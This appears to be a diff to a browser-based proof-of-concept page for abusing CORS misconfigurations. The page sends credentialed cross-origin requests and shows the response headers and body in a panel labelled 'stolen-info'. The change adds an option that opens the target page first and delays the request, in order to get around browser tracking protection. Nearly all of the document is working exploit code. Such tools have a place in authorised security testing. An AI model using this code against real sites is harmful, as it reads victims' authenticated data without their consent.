@@ -24,7 +24,7 @@ Custom content type (optional): <input type="text" placeholder="text/plain" name
 <input type="checkbox" name="postreq"/> POST request<br />
 Post data: <input id="postdata" type="text" placeholder="test=demo" name="postdata" size="100"><br />
 <input type="checkbox" name="autosend"/> Autosend payload<br />
-<input type="checkbox" name="open_page" disabled="disabled"/> Open target page to bypass tracking protection (<a href="https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/#:~:text=Bypassing%20tracking%20protection">source</a>) (todo)<br />
+<input type="checkbox" name="open_page"/> Open target page to bypass tracking protection (<a href="https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/#:~:text=Bypassing%20tracking%20protection">source</a>) (incompatible with autosend)<br />
 <button id="btn-send" class="btn btn-info">Send CORS request</button>
 </form>
 </pre>
@@ -51,13 +51,16 @@ function parseConfig() {
   document.forms.settings.contenttype.value = config.contenttype;
   document.forms.settings.authenticated.checked = config.authenticated ? "checked" : "";
   document.forms.settings.postreq.checked = config.post ? "checked" : "";
+    // disable auto_send if open_page is enabled
+    if(config.open_page) config.autosend = false;
   document.forms.settings.autosend.checked = config.autosend ? "checked" : "";
   // disable form data if post is not checked
   document.forms.settings.postdata.disabled = config.post ? "" : "disabled";
   // disable btn_send if autosend is enabled
   document.getElementById("btn-send").disabled = config.autosend ? "disabled" : "";
   document.forms.settings.open_page.checked = config.open_page ? "checked" : "";
-
+  // disable auto_send if open_page is enabled
+  document.forms.settings.autosend.disabled = config.open_page ? "disabled" : "";
   url = new URL(config.url);
   document.getElementById("url").textContent = url.hostname;
 
@@ -93,55 +96,61 @@ function saveConfig() {
 
 function sendCORS(e) {
   // clear previous messages
-  document.getElementById("stolen-info").innerHTML = "<div class='spinner-border' role='status'><span class='sr-only'>Loading...</span></div>";
-  document.getElementById("stolen-info").classList.add("alert-info");
-  document.getElementById("stolen-info").classList.remove("alert-danger");
-  if(e) e.preventDefault()
-  try {
-    var xhttp = new XMLHttpRequest();
-    xhttp.onreadystatechange = function() {
-      // response headers received
-      if (this.readyState == 2) {
-        if(document.getElementById("stolen-info").innerText == "Loading...") document.getElementById("stolen-info").innerHTML = "";
-        var headers = this.getAllResponseHeaders();
-        var headerArray = headers.split('\r\n');
-        var headerObj = {};
-        for (var i = 0; i < headerArray.length; i++) {
-          var header = headerArray[i].split(': ');
-          if (header.length > 1) {
-            headerObj[header[0]] = header[1];
-          }
-        }
-        document.getElementById("stolen-info").innerHTML += "<strong>Response Headers:</strong><br>" + htmlEntities(JSON.stringify(headerObj, null, 2))+"<br>";
-      } else if (this.readyState == 4) {
-        if(document.getElementById("stolen-info").innerText == "Loading...") document.getElementById("stolen-info").innerHTML = "";
-        document.getElementById("stolen-info").innerHTML += "<strong>Response Body:</strong><br>" + htmlEntities(this.responseText);
-        if(this.status.toString().charAt(0) == "2") {
-          document.getElementById("stolen-info").classList.remove("alert-info","alert-danger","alert-warning");
-          document.getElementById("stolen-info").classList.add("alert-info");
-        } else {
-          document.getElementById("stolen-info").classList.remove("alert-info");
-          document.getElementById("stolen-info").classList.add("alert-danger");
-          if (this.responseText.length == 0) {
-            document.getElementById("stolen-info").innerHTML += "(no response body, see console for more details)";
-          }
-        }
-      }
-    };
-    var method = config.post ? "POST" : "GET";
-    xhttp.open(method, url, true);
-    if(config.contenttype) {
-    xhttp.setRequestHeader('Content-type', config.contenttype);
-    }
-    xhttp.withCredentials = config.authenticated;
-    if (method === "GET") xhttp.send();
-    if (method === "POST") xhttp.send(config.postdata);
-    return false;
-  } catch(e) {
-    document.getElementById("stolen-info").innerHTML = "Error: <div class='alert alert-danger'>"+htmlEntities(e)+"</div>";
-    return false;
+  if(config.open_page) {
+    // open the target page in a new window
+    open(config.url); 
   }
-  
+
+  setTimeout(() => {
+    document.getElementById("stolen-info").innerHTML = "<div class='spinner-border' role='status'><span class='sr-only'>Loading...</span></div>";
+    document.getElementById("stolen-info").classList.add("alert-info");
+    document.getElementById("stolen-info").classList.remove("alert-danger");
+    if(e) e.preventDefault()
+    try {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        // response headers received
+        if (this.readyState == 2) {
+          if(document.getElementById("stolen-info").innerText == "Loading...") document.getElementById("stolen-info").innerHTML = "";
+          var headers = this.getAllResponseHeaders();
+          var headerArray = headers.split('\r\n');
+          var headerObj = {};
+          for (var i = 0; i < headerArray.length; i++) {
+            var header = headerArray[i].split(': ');
+            if (header.length > 1) {
+              headerObj[header[0]] = header[1];
+            }
+          }
+          document.getElementById("stolen-info").innerHTML += "<strong>Response Headers:</strong><br>" + htmlEntities(JSON.stringify(headerObj, null, 2))+"<br>";
+        } else if (this.readyState == 4) {
+          if(document.getElementById("stolen-info").innerText == "Loading...") document.getElementById("stolen-info").innerHTML = "";
+          document.getElementById("stolen-info").innerHTML += "<strong>Response Body:</strong><br>" + htmlEntities(this.responseText);
+          if(this.status.toString().charAt(0) == "2") {
+            document.getElementById("stolen-info").classList.remove("alert-info","alert-danger","alert-warning");
+            document.getElementById("stolen-info").classList.add("alert-info");
+          } else {
+            document.getElementById("stolen-info").classList.remove("alert-info");
+            document.getElementById("stolen-info").classList.add("alert-danger");
+            if (this.responseText.length == 0) {
+              document.getElementById("stolen-info").innerHTML += "(no response body, see console for more details)";
+            }
+          }
+        }
+      };
+      var method = config.post ? "POST" : "GET";
+      xhttp.open(method, url, true);
+      if(config.contenttype) {
+      xhttp.setRequestHeader('Content-type', config.contenttype);
+      }
+      xhttp.withCredentials = config.authenticated;
+      if (method === "GET") xhttp.send();
+      if (method === "POST") xhttp.send(config.postdata);
+      return false;
+    } catch(e) {
+      document.getElementById("stolen-info").innerHTML = "Error: <div class='alert alert-danger'>"+htmlEntities(e)+"</div>";
+      return false;
+    }
+  }, config.open_page ? 2000 : 0); // delay to allow the page to load
 }
 // add a debouncer to the post data field
 document.getElementById('postdata').addEventListener('input', function() {
